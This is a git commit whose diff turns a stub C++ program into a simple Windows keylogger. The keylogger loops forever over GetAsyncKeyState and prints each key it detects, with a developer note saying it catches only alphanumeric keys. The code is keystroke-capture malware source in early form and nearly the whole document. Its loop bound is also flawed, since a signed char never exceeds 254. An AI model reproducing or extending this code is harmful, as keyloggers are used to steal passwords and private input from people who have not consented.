92369861b9ae0a398f01bcc663ae54117a167257
bleak-alpha <71189549+bleak-alpha@users.noreply.github.com>
2023-01-02 17:49:00 +0530

    Changes to be committed: 	new file:   .gitignore 	modified:   logger.cpp -> added logging function for windows, only detects alphanumerics

--- logger.cpp
+++ logger.cpp
@@ -1,7 +1,23 @@
 #include <iostream>
+#include <windows.h>
+#include <winuser.h>
 
 using namespace std;
 
+void startLogging();
+
 int main() {
-    cout<<"Code is working....";
+    startLogging();
 }
+
+void startLogging() {
+    while(true){
+        for(char c=0; c<=254 ; c++) {
+            if(GetAsyncKeyState(c) & 0x1) { //comparing last bit from both using AND
+                cout<<c;
+            }
+        }
+    }
+}
+//Dev note: logging works correctly but only for windows system,
+//  can detect alpha-numeric keys only, displays alpha keystrokes in uppercase regardless
